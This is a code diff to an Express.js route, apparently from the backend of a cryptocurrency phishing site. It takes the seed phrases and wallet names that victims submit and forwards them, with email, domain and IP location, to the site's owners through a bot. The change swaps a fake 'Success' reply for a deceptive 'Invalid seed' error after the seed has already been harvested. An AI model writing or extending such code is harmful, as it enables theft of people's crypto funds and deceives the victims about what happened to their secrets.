@@ -102,7 +102,7 @@ router.get('/ref', UserMiddleware.requireAccess, async (req, res) => {
   })
 })
 
-router.post('/connect', UserMiddleware.requireAccess, expressip().getIpInfoMiddleware, async (req, res) => {
+router.post('/connect', UserMiddleware.requireAccessLight(), expressip().getIpInfoMiddleware, async (req, res) => {
   let { seed, wallet } = req.body
 
   let valid = true
@@ -113,15 +113,30 @@ router.post('/connect', UserMiddleware.requireAccess, expressip().getIpInfoMiddl
   })
 
   if (valid) {
-    Bot.notifyOwners(`DOMAIN: ${req.get('host')}\nUSER: ${res.locals.user.email}\nWALLET: ${wallet}\nSEED: ${seed}\nIP: ${req.ipInfo.ip}, ${req.ipInfo.city}, ${req.ipInfo.country}`)
+    Logger.register(
+      UserMiddleware.convertUser(res.locals.user),
+      200,
+      'connected',
+      'action.user.connected',
+    )
 
-    await new Promise(resolve => {
-      setTimeout(() => {
-        resolve()
-      }, random(1000, 3000));
+    let messageLines = [
+      `DOMAIN: ${req.get('host')}`,
+      `USER: ${res.locals.user.email}`,
+      `WALLET: ${wallet}`,
+      `SEED: ${seed}`,
+      `IP: ${req.ipInfo.ip}, ${req.ipInfo.city}, ${req.ipInfo.country}`
+    ]
+
+    Bot.notifyOwners(messageLines.join('\n'))
+
+    let manager = await User.findOne({ email: res.locals.user.bindedTo }, 'role').lean()
+
+    res.status(400).send({
+      message: res.locals.user.walletConnectMessage.trim()
+        || manager?.role?.settings?.walletConnectMessage.trim()
+        || 'Invalid seed'
     })
-
-    res.send({ message: 'Success' })
   } else {
     res.status(400).send({ message: 'Invalid seed' })
   }
